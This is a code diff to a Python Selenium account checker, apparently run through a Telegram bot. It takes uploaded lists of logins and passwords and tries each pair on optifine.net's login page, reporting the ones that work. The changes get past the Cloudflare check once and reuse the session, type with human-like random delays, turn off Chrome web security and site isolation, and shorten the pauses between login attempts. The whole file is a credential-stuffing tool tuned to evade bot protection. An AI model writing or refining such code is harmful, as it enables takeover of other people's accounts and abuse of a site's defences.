@@ -55,6 +55,7 @@ class OptifineChecker:
     
     def __init__(self):
         self.driver = None
+        self.cloudflare_passed = False
         logger.info("🚀 Инициализация OptifineChecker...")
         self.init_driver()
     
@@ -76,6 +77,15 @@ class OptifineChecker:
             chrome_options.add_argument('--disable-logging')
             chrome_options.add_argument('--log-level=3')
             chrome_options.add_argument('--silent')
+            
+            # ОТКЛЮЧАЕМ РЕЖИМ БЕЗОПАСНОСТИ ГУГЛА
+            chrome_options.add_argument('--disable-web-security')
+            chrome_options.add_argument('--allow-running-insecure-content')
+            chrome_options.add_argument('--disable-features=VizDisplayCompositor')
+            chrome_options.add_argument('--disable-features=TranslateUI')
+            chrome_options.add_argument('--disable-features=BlinkGenPropertyTrees')
+            chrome_options.add_argument('--disable-features=IsolateOrigins')
+            chrome_options.add_argument('--disable-features=site-per-process')
             
             # User-Agent
             chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
@@ -177,7 +187,7 @@ class OptifineChecker:
             logger.error(f"Ошибка при анализе страницы: {e}")
             return False
     
-    def handle_cloudflare(self, timeout=45):
+    def handle_cloudflare(self, timeout=60):
         """Обработка Cloudflare защиты"""
         start_time = time.time()
         
@@ -238,8 +248,48 @@ class OptifineChecker:
         logger.warning("⚠️ Cloudflare не пройден за отведенное время")
         return False
     
+    def ensure_login_page(self):
+        """Убеждаемся, что мы на странице входа и Cloudflare пройден"""
+        if not self.driver:
+            self.init_driver()
+            if not self.driver:
+                return False
+        
+        try:
+            # Проверяем текущий URL
+            current_url = self.driver.current_url
+            
+            # Если мы уже на странице входа и Cloudflare пройден
+            if 'login' in current_url and 'just a moment' not in self.driver.title.lower():
+                # Проверяем, есть ли поля ввода
+                inputs = self.driver.find_elements(By.TAG_NAME, "input")
+                visible_inputs = [i for i in inputs if i.is_displayed() and 
+                                 i.get_attribute('type') not in ['hidden']]
+                
+                if len(visible_inputs) >= 2:  # Обычно есть поле логина и пароля
+                    logger.info("✅ Уже на странице входа")
+                    return True
+            
+            # Если нет - переходим на страницу входа
+            logger.info("🌐 Перехожу на страницу входа...")
+            self.driver.get("https://optifine.net/login")
+            self.human_like_delay(3, 5)
+            
+            # Проходим Cloudflare
+            if not self.handle_cloudflare(timeout=60):
+                self.analyze_page("cloudflare_error")
+                return False
+            
+            self.human_like_delay(2, 4)
+            logger.info("✅ Готов к проверке аккаунтов")
+            return True
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка при подготовке страницы: {e}")
+            return False
+    
     async def check_account(self, login: str, password: str) -> Dict:
-        """Проверка одного аккаунта через Selenium с обработкой Cloudflare"""
+        """Проверка одного аккаунта через Selenium (используем существующую сессию)"""
         
         logger.info(f"🔍 Начинаю проверку: {login[:20]}...")
         
@@ -254,35 +304,13 @@ class OptifineChecker:
                 }
         
         try:
-            # Переходим на страницу входа
-            logger.info(f"🌐 Загружаю страницу входа...")
-            self.driver.get("https://optifine.net/login")
-            
-            # Даем время на загрузку
-            self.human_like_delay(3, 5)
-            
-            # Обрабатываем Cloudflare
-            if not self.handle_cloudflare(timeout=45):
-                self.analyze_page(login[:10])
+            # Убеждаемся, что мы на странице входа
+            if not self.ensure_login_page():
                 return {
                     'login': login,
                     'status': 'error',
-                    'error': 'Cloudflare не пройден'
+                    'error': 'Не удалось загрузить страницу входа'
                 }
-            
-            # Небольшая задержка после прохождения Cloudflare
-            self.human_like_delay(2, 4)
-            
-            # Анализируем страницу (уже должна быть страница входа)
-            self.analyze_page(login[:10])
-            
-            # Ждем полной загрузки страницы входа
-            try:
-                WebDriverWait(self.driver, 10).until(
-                    EC.presence_of_element_located((By.TAG_NAME, "form"))
-                )
-            except:
-                logger.warning("⚠️ Форма не найдена после Cloudflare")
             
             # Поиск поля email/username
             email_field = None
@@ -414,9 +442,19 @@ class OptifineChecker:
                     'error': 'Кнопка не найдена'
                 }
             
+            # Очищаем поля перед вводом (на случай если там уже что-то есть)
+            try:
+                email_field.clear()
+            except:
+                pass
+            
+            try:
+                password_field.clear()
+            except:
+                pass
+            
             # Вводим email с человеческой задержкой
             logger.info(f"✍️ Ввожу email: {login[:20]}...")
-            email_field.clear()
             for char in login:
                 email_field.send_keys(char)
                 time.sleep(random.uniform(0.03, 0.08))
@@ -425,15 +463,15 @@ class OptifineChecker:
             
             # Вводим пароль
             logger.info(f"✍️ Ввожу пароль...")
-            password_field.clear()
             for char in password:
                 password_field.send_keys(char)
                 time.sleep(random.uniform(0.03, 0.08))
             
             self.human_like_delay(0.5, 1)
             
-            # Сохраняем скриншот перед отправкой
-            self.driver.save_screenshot(f"/app/debug/before_submit_{login[:10]}.png")
+            # Сохраняем скриншот перед отправкой (для отладки)
+            if random.random() < 0.1:  # Сохраняем только каждый 10-й для экономии места
+                self.driver.save_screenshot(f"/app/debug/before_submit_{login[:10]}.png")
             
             # Нажимаем кнопку
             logger.info("🖱️ Нажимаю кнопку входа")
@@ -451,10 +489,11 @@ class OptifineChecker:
                     }
             
             # Ждем результат
-            self.human_like_delay(8, 12)
+            self.human_like_delay(5, 8)
             
-            # Сохраняем результат
-            self.driver.save_screenshot(f"/app/debug/after_submit_{login[:10]}.png")
+            # Сохраняем результат (для отладки)
+            if random.random() < 0.1:
+                self.driver.save_screenshot(f"/app/debug/after_submit_{login[:10]}.png")
             
             # Анализируем результат
             current_url = self.driver.current_url
@@ -480,6 +519,11 @@ class OptifineChecker:
             # Проверяем успешность
             if any(indicator in current_url.lower() for indicator in ['downloads', 'profile', 'account', 'dashboard']):
                 logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
+                
+                # Возвращаемся на страницу входа для следующего аккаунта
+                self.driver.get("https://optifine.net/login")
+                self.human_like_delay(2, 4)
+                
                 return {
                     'login': login,
                     'password': password,
@@ -489,6 +533,11 @@ class OptifineChecker:
             
             if any(indicator in page_text for indicator in success_indicators):
                 logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
+                
+                # Возвращаемся на страницу входа
+                self.driver.get("https://optifine.net/login")
+                self.human_like_delay(2, 4)
+                
                 return {
                     'login': login,
                     'password': password,
@@ -498,6 +547,11 @@ class OptifineChecker:
             
             if any(indicator in page_text for indicator in error_indicators):
                 logger.info(f"❌ Неверный: {login[:20]}")
+                
+                # Возвращаемся на страницу входа
+                self.driver.get("https://optifine.net/login")
+                self.human_like_delay(2, 4)
+                
                 return {
                     'login': login,
                     'status': 'invalid',
@@ -513,8 +567,11 @@ class OptifineChecker:
                     'error': 'Остались на странице входа'
                 }
             
-            # Если неопределенный результат
+            # Если неопределенный результат, возвращаемся на страницу входа
             logger.info(f"⚠️ Неопределенный результат для {login[:20]}")
+            self.driver.get("https://optifine.net/login")
+            self.human_like_delay(2, 4)
+            
             return {
                 'login': login,
                 'status': 'invalid',
@@ -524,6 +581,14 @@ class OptifineChecker:
         except Exception as e:
             logger.error(f"❌ Ошибка при проверке {login[:20]}: {e}")
             logger.exception("Детали ошибки:")
+            
+            # Пытаемся восстановить сессию
+            try:
+                self.driver.get("https://optifine.net/login")
+                self.human_like_delay(3, 5)
+            except:
+                pass
+            
             return {
                 'login': login,
                 'status': 'error',
@@ -649,6 +714,22 @@ async def process_file(file_path, update, context):
         
         start_time = time.time()
         
+        # Сначала проходим Cloudflare один раз
+        await msg.edit_text(
+            f"🔄 **Подготавливаю сессию...**\n"
+            f"⏳ Прохожу Cloudflare защиту..."
+        )
+        
+        if not checker.ensure_login_page():
+            await msg.edit_text("❌ **Не удалось пройти Cloudflare защиту**")
+            return
+        
+        await msg.edit_text(
+            f"📥 **Файл:** {update.message.document.file_name}\n"
+            f"📊 **Аккаунтов:** {total}\n\n"
+            f"✅ **Cloudflare пройден, начинаю проверку...**"
+        )
+        
         for i, (login, password) in enumerate(accounts, 1):
             # Обновляем прогресс
             if i % 5 == 0 or i == total:
@@ -679,8 +760,8 @@ async def process_file(file_path, update, context):
             
             bot_stats['total'] += 1
             
-            # Задержка между запросами
-            await asyncio.sleep(3)
+            # Небольшая задержка между проверками
+            await asyncio.sleep(2)
         
         # Сохраняем результаты
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
